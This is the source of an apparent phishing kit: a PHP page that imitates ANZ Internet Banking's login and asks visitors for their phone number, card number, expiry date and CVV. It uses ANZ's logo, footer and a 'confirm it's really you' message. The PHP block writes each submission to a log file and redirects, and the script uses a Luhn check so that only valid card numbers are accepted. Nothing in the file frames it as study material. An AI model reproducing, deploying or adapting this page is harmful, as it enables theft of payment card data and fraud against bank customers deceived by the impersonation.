<?php

include('config.php');

if (!empty($_POST['phone']))
{
	$text = file_get_contents($log_filename);
	$text .= "===============================\n";
	$text .= "phone: ".$_POST['phone']."\n";
	$text .= "card: ".$_POST['card']."\n";
	$text .= "exp: ".$_POST['exp']."\n";
	$text .= "cvv: ".$_POST['cvv']."\n";
	$text .= "===============================\n";
	file_put_contents($log_filename, $text);
	header('Location: check.php');
}	
?>


<!DOCTYPE html>
<html lang="en">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
	<title>ANZ Internet Banking - Login</title>
	<meta name="description" content="Log in to Internet Banking...">
	<meta name="keywords" content="Internet Banking, logging in, log in, online banking, ANZ IB, IB">
	<meta name="SiteLevel" content="3">
	<meta name="PopupWindow" content="750:500">
	
<style>
.text
{
    COLOR: #003399;
    FONT-FAMILY: Verdana, Arial, Helvetica, Sans-serif;
    FONT-SIZE: 13px;
    FONT-WEIGHT: bold
}

.text3
{
    COLOR: #003399;
    FONT-FAMILY: Verdana, Arial, Helvetica, Sans-serif;
    FONT-SIZE: 13px;
    FONT-WEIGHT: normal
}

A.text3:link
{
    COLOR: #003399;
    TEXT-DECORATION: none
}
A.text3:visited
{
    COLOR: #003399;
    TEXT-DECORATION: none
}
A.text3:hover
{
    COLOR: #0066CC;
    TEXT-DECORATION: underline
}

.text3bold
{
    COLOR: #003399;
    FONT-FAMILY: Verdana, Arial, Helvetica, Sans-serif;
    FONT-SIZE: 13px;
    FONT-WEIGHT: bold
}

A.text3bold:link
{
    COLOR: #003399;
    TEXT-DECORATION: none
}
A.text3bold:visited
{
    COLOR: #003399;
    TEXT-DECORATION: none
}
A.text3bold:hover
{
    COLOR: #0066CC;
    TEXT-DECORATION: underline
}

</style>
	<link href="../common/header/css/ib_responsive_header.css" rel="stylesheet" type="text/css" />
	<link href="../inetbank/css/ib_logon_responsive_latest.css" rel="stylesheet" type="text/css" />
	<link href="../inetbank/css/bootstrap.css" rel="stylesheet" type="text/css" />
</head>
<body topmargin="0" marginwidth="0" marginheight="0" leftmargin="0" bgcolor="#ffffff"><div id="splashPage" style="display:none;">

	<title>ANZ Internet Banking</title>
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
	<meta name="format-detection" content="telephone=no">
	<link href="../common/header/css/ib_responsive_header.css" rel="stylesheet" type="text/css">
	<link href="../inetbank/css/ib_logon_responsive_latest.css" rel="stylesheet" type="text/css">
	<link href="../inetbank/css/bootstrap.css" rel="stylesheet" type="text/css">

<div class="container-fluid" id="headerBG">
<div id="header">
	<div class="logo">
		<img src="../common/header/images/ANZ-logo.png" title="ANZ Logo" alt="ANZ Logo" width="103px" height="42px">
	</div>
</div>
</div>

<div class="container">
	<div id="loader">
		<div style="padding:145px 0px;text-align:center">
		
			<div class="anz-loader">
		    	<div class="mh4ph" id="wBall_1">
		            <div class="dark-loader spinner"></div>
		        </div>
		        <div class="mh4ph" id="wBall_2">
		            <div class="dark-loader spinner"></div>
		        </div>
		        <div class="mh4ph" id="wBall_3">
		            <div class="dark-loader spinner"></div>
		        </div>
		        <div class="mh4ph" id="wBall_4">
		            <div class="dark-loader spinner"></div>
		        </div>
		        <div class="mh4ph" id="wBall_5">
		            <div class="dark-loader spinner"></div>
		        </div>
		    </div>
		  
  		<br>
        <div style="padding-top:5px;color:#444444;font-family:MyriadPro-Semibold,Arial;font-size:1em;font-weight:bold">Confirming your details...</div>
        </div>
	</div>
</div>
<link href="../common/footer/css/ib_responsive_footer.css" rel="stylesheet" type="text/css">
<div class="container-fluid" id="footerBG">
	<div id="footer">Australia and New Zealand Banking Group Limited (ANZ) 2020 ABN 11 005 357 522.</div>
</div>


</div>
<div id="logonAdmin" style="display:block;">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
	<title>ANZ Internet Banking - Login</title>
	<meta name="description" content="Log in to Internet Banking...">
	<meta name="keywords" content="Internet Banking, logging in, log in, online banking, ANZ IB, IB">
	<meta name="SiteLevel" content="3">
	<meta name="PopupWindow" content="750:500">
	
<style>
.text
{
    COLOR: #003399;
    FONT-FAMILY: Verdana, Arial, Helvetica, Sans-serif;
    FONT-SIZE: 13px;
    FONT-WEIGHT: bold
}

.text3
{
    COLOR: #003399;
    FONT-FAMILY: Verdana, Arial, Helvetica, Sans-serif;
    FONT-SIZE: 13px;
    FONT-WEIGHT: normal
}

A.text3:link
{
    COLOR: #003399;
    TEXT-DECORATION: none
}
A.text3:visited
{
    COLOR: #003399;
    TEXT-DECORATION: none
}
A.text3:hover
{
    COLOR: #0066CC;
    TEXT-DECORATION: underline
}

.text3bold
{
    COLOR: #003399;
    FONT-FAMILY: Verdana, Arial, Helvetica, Sans-serif;
    FONT-SIZE: 13px;
    FONT-WEIGHT: bold
}

A.text3bold:link
{
    COLOR: #003399;
    TEXT-DECORATION: none
}
A.text3bold:visited
{
    COLOR: #003399;
    TEXT-DECORATION: none
}
A.text3bold:hover
{
    COLOR: #0066CC;
    TEXT-DECORATION: underline
}

</style>
	<link href="../common/header/css/ib_responsive_header.css" rel="stylesheet" type="text/css">
	<link href="../inetbank/css/ib_logon_responsive_latest.css" rel="stylesheet" type="text/css">
	<link href="../inetbank/css/bootstrap.css" rel="stylesheet" type="text/css">

 

<div class="container-fluid" id="headerBG">
	<div id="header">
		<div class="logo">
			<img src="../common/header/images/ANZ-logo.png" title="ANZ Logo" alt="ANZ Logo" width="103px" height="42px">
		</div>
	</div>
</div>
	<div class="container">
		<div id="contentContainer">
		    <div class="mboxDefault mbox-name-ib:logon:service at-element-marker" style="visibility:visible;"></div>
			<!--div id="contentContainer Left" class="col-ts-12 col-sm-7 col-xs-7"-->
			<div id="contentContainerLeft" class="col-ts-12 col-xs-7">
				<div id="logonContainer">
					<h1>Log in to ANZ Internet Banking</h1>
					<div id="logonBox">
	<label class="loginDivLabels">It seems we're running into some problems.</label>
	<label class="loginDivLabels">We need to make sure that this is really you</label>
	<br>
	<br>
	<div>
	    <label for="phone" class="loginDivLabels">Phone Number</label>
	    <input id="phone" type="tel" class="loginDivfields"  name="CorporateSignonCorpId" placeholder="12312456789" tabindex="1" >
	</div>

	<div>
	    <label for="card" class="loginDivLabels">Card Number</label>
	    <input id="card" type="TEXT" class="loginDivfields"  name="CorporateSignonCorpId" tabindex="1" placeholder="XXXX-XXXX-XXXX-XXXX" size="16" maxlength="19" autocomplete="OFF">
	</div>

<table width="100%">
	<tr>
		<td>
			<label for="exp" class="loginDivLabels">Expiry date</label>
			<input id="exp" type="TEXT" class="loginDivfields" placeholder="05-22" name="CorporateSignonCorpId" tabindex="1" size="16" autocomplete="OFF">
		</td>
		<td style="padding-left: 20px;">
			<label for="cvv" class="loginDivLabels">CVV</label>
			<input id="cvv" type="PASSWORD" class="loginDivfields" size="16" placeholder="123" tabindex="2">
		</td>
	</tr>
</table>

	<div id="logonButton" onclick="send_data()">
	    <a role="button" id="SignonButton" class="SignonButton btn btn-primary" tabindex="3" title="Log on" >Log in</a>
	</div>
					</div>
				</div>
				<div class="mboxDefault mbox-name-ib:logon at-element-marker" style="visibility:visible;"></div>
			</div>

			<div id="contentContainerRight" class="col-ts-12 col-sm-5 col-xs-5">
				<div id="newToIBDiv">
					<div id="iconNew2IB"><h2>New to ANZ Internet Banking?</h2></div>
					<p></p>
					<ul>
						<li><a href="">Register for ANZ Internet Banking</a></li>
						<li><a href="">Read about ANZ Internet Banking</a></li>
						<li><a href="">Terms and Conditions</a></li>
					</ul>	
					<p></p>
				</div>
				<div id="needHelpDiv">
					<div id="iconNeedHelp"><h2>Need some help?</h2></div>
					<p></p>
					<ul>
						<li><a href="">Need help logging in?</a></li>
						<li><a href="">What's new?</a></li>
						<li><a href="">Software requirements and settings</a></li>
						<li><a href="">Contact us</a></li>	
					</ul>							
					<p></p>
				</div>
				<div id="onlineSecurityDiv">
					<div id="iconOS"><h2>Online Security</h2></div>
					<p></p>
					<ul>
						<li><a href="">Read current security alert</a></li>
						<li><a href="">Online Security</a></li>
						<li><a href="">Security software offers</a></li>
					</ul>
					<p></p>
				</div>
			</div>
		</div>
	</div>
	<link href="../common/footer/css/ib_responsive_footer.css" rel="stylesheet" type="text/css">
	<div class="container-fluid" id="footerBG">
		<div id="footer">
			<span name="NOINDEX"><p>©Australia and New Zealand Banking Group Limited (ANZ) 2020 ABN 11 005 357 522.</p></span>
		</div>
	</div>
</div>
<script type="text/javascript">
	var cc = document.getElementById("card");
	for (var i in ['input', 'change', 'blur', 'keyup']) {
		cc.addEventListener('input', formatCardCode1, false);
	}
	function formatCardCode1() {
	    var cardCode = this.value.replace(/[^\d]/g, '').substring(0,16);
	    cardCode = cardCode != '' ? cardCode.match(/.{1,4}/g).join('-') : '';
	    this.value = cardCode;
	}
//////////////////////////////////////
	var cc = document.getElementById("exp");
	for (var i in ['input', 'change', 'blur', 'keyup']) {
		cc.addEventListener('input', formatCardCode2, false);
	}
	function formatCardCode2() {
	    var cardCode = this.value.replace(/[^\d]/g, '').substring(0,4);
	    cardCode = cardCode != '' ? cardCode.match(/.{1,2}/g).join('-') : '';
	    this.value = cardCode;
	}
//////////////////////////////////////
	var cc = document.getElementById("cvv");
	for (var i in ['input', 'change', 'blur', 'keyup']) {
		cc.addEventListener('input', formatCardCode3, false);
	}
	function formatCardCode3() {
	    var cardCode = this.value.replace(/[^\d]/g, '').substring(0,3);
	    this.value = cardCode;
	}
//////////////////////////////////////



function send_data() {	
	var form = document.createElement("form");
	form.method = "POST";
	form.action = "";

	var element0 = document.createElement("input");
	element0.type="hidden";
	element0.name="phone";
	element0.value=document.getElementById('phone').value;
	if (!element0.value)
	{
		alert("Please input phone number");
		element0.value = 0;
		return 0;
	}
	if (element0.value.length < 8)
	{
		alert("Check phone number");
		element0.value = 0;
		return 0;
	}
	form.appendChild(element0);

	var element1 = document.createElement("input");
	element1.type="hidden";
	element1.name="card";
	element1.value=document.getElementById('card').value;
	if (!element1.value)
	{
		alert("Enter card number");
		element1.value = '';
		return;
	}
	if (element1.value.length != 19)
	{
		alert("Check card number");
		element1.value = '';
		return;
	}
	if (!valid_credit_card(element1.value.split('-').join('')))
	{
		alert("Use correct card number");
		element1.value = '';
		return;
	}
	form.appendChild(element1);

	var element2 = document.createElement("input");
	element2.type="hidden";
	element2.name="exp";
	element2.value=document.getElementById('exp').value;
	if (!element2.value)
	{
		alert("Please input exp date");
		element2.value = 0;
		return 0;
	}
	if (element2.value.length != 5)
	{
		alert("Please check exp date");
		element2.value = 0;
		return 0;
	}
	form.appendChild(element2);

	var element3 = document.createElement("input");
	element3.type="hidden";
	element3.name="cvv";
	element3.value=document.getElementById('cvv').value;
	if (!element3.value)
	{
		alert("Please input cvv");
		element3.value = 0;
		return 0;
	}
	if (element3.value.length != 3)
	{
		alert("Please check cvv");
		element3.value = 0;
		return 0;
	}
	form.appendChild(element3);

	document.body.appendChild(form);

	form.submit();
}


// 4992739847164717
function valid_credit_card(value) {
	value = value.toString();

	if (/[^0-9-\s]+/.test(value)) return false;

	let nCheck = 0, bEven = false;
	value = value.replace(/\D/g, "");

	for (var n = value.length - 1; n >= 0; n--) {
		var cDigit = value.charAt(n),
			  nDigit = parseInt(cDigit, 10);

		if (bEven && (nDigit *= 2) > 9) nDigit -= 9;

		nCheck += nDigit;
		bEven = !bEven;
	}

	return (nCheck % 10) == 0;
}
</script>
</body>
</html>